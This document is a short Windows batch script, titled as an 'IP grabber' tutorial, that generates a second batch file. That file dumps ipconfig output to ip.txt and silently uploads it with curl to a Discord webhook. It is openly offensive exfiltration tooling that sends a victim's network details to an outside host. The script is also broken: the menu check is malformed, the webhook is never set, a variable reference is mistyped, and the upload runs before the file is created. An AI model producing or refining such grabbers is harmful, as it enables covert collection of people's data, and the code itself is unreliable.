@echo off
chcp 65001
title IP grabber tut

:menu
echo  ██████  ██████   █████  ██████  ██████  ███████ ██████  
echo ██       ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
echo ██   ███ ██████  ███████ ██████  ██████  █████   ██████  
echo ██    ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
echo  ██████  ██   ██ ██   ██ ██████  ██████  ███████ ██   ██
                                        
set /p choice=1

if "%choice%"==1 goto Grabber 

:Grabber
cls
echo ██ ██████       ██████  ██████   █████  ██████  ██████  ███████ ██████  
echo ██ ██   ██     ██       ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
echo ██ ██████      ██   ███ ██████  ███████ ██████  ██████  █████   ██████  
echo ██ ██          ██    ██ ██   ██ ██   ██ ██   ██ ██   ██ ██      ██   ██ 
echo ██ ██           ██████  ██   ██ ██   ██ ██████  ██████  ███████ ██   ██

if "%webhook%"==""(
    echo discord webhook URL is required
    pause
    goto menu
)

echo Connection (True) Making op logger script/
timeout /t 5 >nul

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F 1=@"ip.txt" %%webhook >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo Ip grabber script has been created as ip_grabber_exec.bat.
pause
goto menu